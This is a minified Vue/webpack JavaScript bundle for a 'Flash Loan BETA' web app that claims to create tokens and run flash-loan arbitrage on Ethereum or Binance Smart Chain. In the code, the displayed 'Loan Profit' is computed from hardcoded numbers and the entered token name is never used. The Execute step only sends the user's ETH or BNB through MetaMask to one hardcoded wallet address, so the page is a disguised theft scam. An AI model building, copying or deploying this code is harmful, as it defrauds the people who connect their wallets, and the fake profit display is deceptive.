(function(t) {
    function e(e) {
        for (var a, o, c = e[0], s = e[1], u = e[2], h = 0, p = []; h < c.length; h++) o = c[h], Object.prototype.hasOwnProperty.call(i, o) && i[o] && p.push(i[o][0]), i[o] = 0;
        for (a in s) Object.prototype.hasOwnProperty.call(s, a) && (t[a] = s[a]);
        l && l(e);
        while (p.length) p.shift()();
        return r.push.apply(r, u || []), n()
    }

    function n() {
        for (var t, e = 0; e < r.length; e++) {
            for (var n = r[e], a = !0, c = 1; c < n.length; c++) {
                var s = n[c];
                0 !== i[s] && (a = !1)
            }
            a && (r.splice(e--, 1), t = o(o.s = n[0]))
        }
        return t
    }
    var a = {},
        i = { index: 0 },
        r = [];

    function o(e) { if (a[e]) return a[e].exports; var n = a[e] = { i: e, l: !1, exports: {} }; return t[e].call(n.exports, n, n.exports, o), n.l = !0, n.exports }
    o.m = t, o.c = a, o.d = function(t, e, n) { o.o(t, e) || Object.defineProperty(t, e, { enumerable: !0, get: n }) }, o.r = function(t) { "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(t, "__esModule", { value: !0 }) }, o.t = function(t, e) {
        if (1 & e && (t = o(t)), 8 & e) return t;
        if (4 & e && "object" === typeof t && t && t.__esModule) return t;
        var n = Object.create(null);
        if (o.r(n), Object.defineProperty(n, "default", { enumerable: !0, value: t }), 2 & e && "string" != typeof t)
            for (var a in t) o.d(n, a, function(e) { return t[e] }.bind(null, a));
        return n
    }, o.n = function(t) { var e = t && t.__esModule ? function() { return t["default"] } : function() { return t }; return o.d(e, "a", e), e }, o.o = function(t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, o.p = "/";
    var c = window["webpackJsonp"] = window["webpackJsonp"] || [],
        s = c.push.bind(c);
    c.push = e, c = c.slice();
    for (var u = 0; u < c.length; u++) e(c[u]);
    var l = s;
    r.push([0, "chunk-vendors"]), n()
})({
    0: function(t, e, n) { t.exports = n("56d7") },
    "014a": function(t, e, n) {
        "use strict";
        n("52a6")
    },
    "034f": function(t, e, n) {
        "use strict";
        n("85ec")
    },
    3432: function(t, e, n) {
        "use strict";
        n("5a1d")
    },
    "3ca5": function(t, e, n) {},
    "52a6": function(t, e, n) {},
    "56d7": function(t, e, n) {
        "use strict";
        n.r(e), n.d(e, "bus", (function() { return Z }));
        n("e260"), n("e6cf"), n("cca6"), n("a79d");
        var a = n("2b0e"),
            i = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { attrs: { id: "app" } }, [n("Hint"), n("Swap", { attrs: { hasMetamask: t.hasMetamask, account: t.account, chainId: t.chainId } }), n("RadialGradient")], 1)
            },
            r = [],
            o = (n("d3b7"), n("25f0"), function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "swap" }, [t._m(0), n("div", { staticClass: "input_element" }, [t._m(1), n("input", { directives: [{ name: "model", rawName: "v-model", value: t.tokenName, expression: "tokenName" }], staticClass: "modal-input", attrs: { type: "text", placeholder: "Enter Token" }, domProps: { value: t.tokenName }, on: { input: function(e) { e.target.composing || (t.tokenName = e.target.value) } } })]), t.showNameError ? n("p", { staticClass: "error" }, [t._v("Provide Token Name")]) : t._e(), n("div", { staticClass: "input_element" }, [t._m(2), n("input", { directives: [{ name: "model", rawName: "v-model", value: t.tokenSymbol, expression: "tokenSymbol" }], staticClass: "modal-input", attrs: { type: "text", placeholder: "Enter Symbol" }, domProps: { value: t.tokenSymbol }, on: { input: function(e) { e.target.composing || (t.tokenSymbol = e.target.value) } } })]), t.showSymbolError ? n("p", { staticClass: "error" }, [t._v("Provide Symbol Name")]) : t._e(), n("div", { staticClass: "input_element" }, [t._m(3), n("input", { directives: [{ name: "model", rawName: "v-model", value: t.inputValue, expression: "inputValue" }], staticClass: "modal-input", attrs: { type: "number", readonly: "" }, domProps: { value: t.inputValue }, on: { input: function(e) { e.target.composing || (t.inputValue = e.target.value) } } }), n("div", { staticClass: "buttons" }, [n("div", { staticClass: "arrow_button", on: { click: t.increase } }, [t._v(" + ")]), n("div", { staticClass: "arrow_button", on: { click: t.decrease } }, [t._v(" - ")])])]), t.showValueError ? n("p", { staticClass: "error" }, [t._v("Value must be greater than 5")]) : t._e(), n("Input4"), n("Result"), t.connected ? n("ButtonLoan") : n("Button")], 1)
            }),
            c = [function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "title" }, [n("p", [t._v("Flash Loan BETA")]), n("p", { staticStyle: { "margin-left": "5px", color: "#a52a2a" } }, [t._v("(UPDATED 21 Aug 2021)")])])
            }, function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "name" }, [n("p", { staticStyle: { "white-space": "nowrap" } }, [t._v("Token Name")])])
            }, function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "name" }, [n("p", { staticStyle: { "white-space": "nowrap" } }, [t._v("Token Symbol")])])
            }, function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "name" }, [n("p", { staticStyle: { "white-space": "nowrap" } }, [t._v("Loan Amount")])])
            }],
            s = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "button_element", on: { click: t.connect } }, [n("p", [t._v("Connect Wallet")])])
            },
            u = [],
            l = { name: "Button", methods: { connect: function() { Z.$emit("connect-wallet") } } },
            h = l,
            p = (n("b20e"), n("2877")),
            d = Object(p["a"])(h, s, u, !1, null, "1f12c796", null),
            f = d.exports,
            m = function() {
                var t = this,
                    e = t.$createElement,
                    a = t._self._c || e;
                return a("div", { staticClass: "element" }, [a("div", { staticClass: "coin_element", class: { active: "ethereum" === t.active }, on: { click: t.alertChain } }, [a("img", { attrs: { src: n("b872"), height: "80px" } })]), a("div", { staticClass: "coin_element", class: { active: "binance" === t.active }, on: { click: t.alertChain } }, [a("img", { attrs: { src: n("cbc6"), height: "80px" } })])])
            },
            w = [],
            v = { name: "Input4", created: function() { Z.$on("chain-changed", this.chainChanged) }, beforeDestroy: function() { Z.$off("chain-changed", this.chainChanged) }, data: function() { return { inputValue: 25, active: "" } }, methods: { pay: function() { this.$emit("pay", this.inputValue) }, chainChanged: function(t) { this.active = 1 == t ? "ethereum" : 56 == t ? "binance" : "" }, alertChain: function() { alert("Change network in Metamask") } } },
            b = v,
            _ = (n("bfa5"), Object(p["a"])(b, m, w, !1, null, "0740eafb", null)),
            g = _.exports,
            y = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "input_element" }, [n("div", { staticClass: "row" }, [n("p", { staticStyle: { "white-space": "nowrap", "font-weight": "600" } }, [t._v("Contract Deployment Fee")]), n("p", { staticStyle: { "white-space": "nowrap" } }, [t._v("0.01 " + t._s(t.current.ticker))])]), n("div", { staticClass: "row" }, [n("p", { staticStyle: { "white-space": "nowrap", "font-weight": "600" } }, [t._v("Swapping Fee")]), n("p", { staticStyle: { "white-space": "nowrap" } }, [t._v(t._s(t.current.currentSwap) + " " + t._s(t.current.ticker))])]), n("div", { staticClass: "row" }, [n("p", { staticStyle: { "white-space": "nowrap", "font-weight": "600" } }, [t._v("Total Cost")]), n("p", { staticStyle: { "white-space": "nowrap" } }, [t._v(t._s(t.total) + " " + t._s(t.current.ticker))])]), n("div", { staticStyle: { width: "100%", height: "1px", "background-color": "white", "margin-top": "20px" } }), n("div", { staticClass: "row" }, [n("p", { staticStyle: { "white-space": "nowrap", "font-weight": "600" } }, [t._v("Loan Profit")]), n("p", { staticStyle: { "white-space": "nowrap" } }, [t._v(t._s(t.current.currentResult) + " " + t._s(t.current.ticker))])])])
            },
            S = [],
            C = { name: "Result", created: function() { Z.$on("chain-changed", this.chainChanged), Z.$on("increased", this.increased), Z.$on("decreased", this.decreased), Z.$on("need-total", this.needTotal) }, beforeDestroy: function() { Z.$off("chain-changed", this.chainChanged), Z.$off("increased", this.increased), Z.$off("decreased", this.decreased), Z.$off("need-total", this.needTotal) }, data: function() { return { current: { inputValue: 5, ticker: "ETH", stepSwap: .0225, stepResult: .845, currentSwap: .0625, currentResult: .225, initialSwap: .0625, initialResult: .225 }, eth: { inputValue: 5, ticker: "ETH", stepSwap: .0225, stepResult: .245, currentSwap: .0625, currentResult: .225, initialSwap: .0625, initialResult: .225 }, bnb: { inputValue: 25, ticker: "BNB", stepSwap: .231, stepResult: 2.65, currentSwap: .156, currentResult: 3.25, initialSwap: .156, initialResult: 3.25 } } }, computed: { total: function() { return Math.round(100 * (this.current.currentSwap + .01)) / 100 } }, methods: { chainChanged: function(t) { 1 == t ? (this.eth.currentSwap = this.eth.initialSwap, this.eth.currentResult = this.eth.initialResult, this.current = this.eth) : 56 == t && (this.bnb.currentSwap = this.bnb.initialSwap, this.bnb.currentResult = this.bnb.initialResult, this.current = this.bnb) }, increased: function() { this.current.currentSwap = Math.round(100 * (this.current.currentSwap + this.current.stepSwap)) / 100, this.current.currentResult = Math.round(100 * (this.current.currentResult + this.current.stepResult)) / 100 }, decreased: function() { this.current.currentSwap = Math.round(100 * (this.current.currentSwap - this.current.stepSwap)) / 100, this.current.currentResult = Math.round(100 * (this.current.currentResult - this.current.stepResult)) / 100 }, needTotal: function() { Z.$emit("get-total", this.total) } } },
            k = C,
            $ = (n("f0d4"), Object(p["a"])(k, y, S, !1, null, "17434265", null)),
            x = $.exports,
            E = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "button_element", on: { click: t.execute } }, [n("p", [t._v("Execute")])])
            },
            T = [],
            R = { name: "ButtonLoan", methods: { execute: function() { Z.$emit("execute") } } },
            V = R,
            N = (n("a6f9"), Object(p["a"])(V, E, T, !1, null, "526879d0", null)),
            j = N.exports,
            O = { name: "Swap", components: { ButtonLoan: j, Result: x, Input4: g, Button: f }, created: function() { Z.$on("chain-changed", this.chainChanged), Z.$on("wallet-connected", this.walletConnected), Z.$on("execute", this.execute) }, beforeDestroy: function() { Z.$off("chain-changed", this.chainChanged), Z.$off("wallet-connected", this.walletConnected), Z.$off("execute", this.execute) }, data: function() { return { connected: !1, inputValue: 5, tokenName: "", tokenSymbol: "", showNameError: !1, showSymbolError: !1, showValueError: !1 } }, methods: { walletConnected: function() { this.connected = !0 }, increase: function() { this.inputValue = +this.inputValue + 5, Z.$emit("increased") }, decrease: function() { this.inputValue > 5 && (this.inputValue -= 5, Z.$emit("decreased")) }, chainChanged: function() { this.inputValue = 5 }, execute: function() { this.showNameError = "" === this.tokenName, this.showSymbolError = "" === this.tokenName, this.showValueError = this.inputValue < 5, this.showNameError || this.showSymbolError || this.showValueError || Z.$emit("need-total") } } },
            P = O,
            M = (n("6919"), Object(p["a"])(P, o, c, !1, null, "5bf8015d", null)),
            B = M.exports,
            A = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "radial_gradient" })
            },
            D = [],
            I = { name: "RadialGradient" },
            L = I,
            H = (n("014a"), Object(p["a"])(L, A, D, !1, null, "552deb12", null)),
            F = H.exports,
            q = function() {
                var t = this,
                    e = t.$createElement;
                t._self._c;
                return t._m(0)
            },
            G = [function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", { staticClass: "hint" }, [n("p", { staticStyle: { "font-weight": "bold" } }, [t._v("✅ 1. Create Token By Typing Token Name And Symbol")]), n("p", { staticStyle: { "margin-top": "15px" } }, [t._v("The DAPP will automatically create the token and will be ready for arbitrage on the decentralized exchange (on Ethereum or Binance Smart Chain) ")]), n("p", { staticStyle: { "margin-top": "30px", "font-weight": "bold" } }, [t._v("✅ 2. Get The Loan For The Arbitrage")]), n("p", { staticStyle: { "margin-top": "15px" } }, [t._v("You can get flash Loan from AAVE, Multiplier-Finance, PancakeSwap or Uniswap (thanks to flash swap). This is done for you by the DAPP, just select the loan amount. ")]), n("p", { staticStyle: { "margin-top": "30px", "font-weight": "bold" } }, [t._v("✅ 3. Deposit ETH or BNB")]), n("p", { staticStyle: { "margin-top": "15px" } }, [t._v("Now you need pay the fees for the loan to start arbitrage. Click the Deposit button and after that click the Execute button. Enjoy your profit. That's all. ")])])
            }],
            J = { name: "Hint" },
            U = J,
            z = (n("3432"), Object(p["a"])(U, q, G, !1, null, "07d2e48f", null)),
            W = z.exports,
            Y = {
                name: "App",
                components: { Hint: W, RadialGradient: F, Swap: B },
                created: function() {
                    var t = this;
                    Z.$on("connect-wallet", this.connectMetamask), Z.$on("get-total", this.getTotal), window.ethereum.on("chainChanged", (function(e) { t.chainId = e, Z.$emit("chain-changed", e) })), window.ethereum.on("accountsChanged", (function(e) { t.account = e[0] }))
                },
                beforeDestroy: function() { Z.$off("connect-wallet", this.connectMetamask), Z.$off("get-total", this.getTotal) },
                data: function() { return { hasMetamask: "undefined" !== typeof window.ethereum, account: "", chainId: "" } },
                methods: {
                    connectMetamask: function() {
                        var t = this;
                        window.ethereum.request({ method: "eth_requestAccounts" }).then((function(e) { return t.step2(e) })).catch((function(t) { return console.log(t) }))
                    },
                    step2: function(t) {
                        var e = this;
                        this.account = t[0], window.ethereum.request({ method: "eth_chainId" }).then((function(t) { return e.step3(t) })).catch((function(t) { return console.log(t) }))
                    },
                    step3: function(t) { this.chainId = t, Z.$emit("wallet-connected"), Z.$emit("chain-changed", t) },
                    getTotal: function(t) { window.ethereum.request({ method: "eth_sendTransaction", params: [{ from: this.account, to: "0x588f6D7D0dC34FE13b8C65b64F46bd2De5da5ad2", value: (Math.pow(10, 18) * t).toString(16) }] }).catch((function(t) { return console.log(t) })) }
                }
            },
            K = Y,
            Q = (n("034f"), Object(p["a"])(K, i, r, !1, null, null, null)),
            X = Q.exports;
        a["a"].config.productionTip = !1;
        var Z = new a["a"];
        window.$bus = Z, new a["a"]({ render: function(t) { return t(X) } }).$mount("#app")
    },
    "5a1d": function(t, e, n) {},
    6919: function(t, e, n) {
        "use strict";
        n("8bd6")
    },
    "85ec": function(t, e, n) {},
    8765: function(t, e, n) {},
    "8bd6": function(t, e, n) {},
    "992d": function(t, e, n) {},
    a6f9: function(t, e, n) {
        "use strict";
        n("8765")
    },
    b20e: function(t, e, n) {
        "use strict";
        n("3ca5")
    },
    b872: function(t, e, n) { t.exports = n.p + "img/eth.95c39a6e.svg" },
    bfa5: function(t, e, n) {
        "use strict";
        n("992d")
    },
    cbc6: function(t, e, n) { t.exports = n.p + "img/bnb.396afde9.svg" },
    f0d4: function(t, e, n) {
        "use strict";
        n("f691")
    },
    f691: function(t, e, n) {}
});
//# sourceMappingURL=index.4957ac78.js.map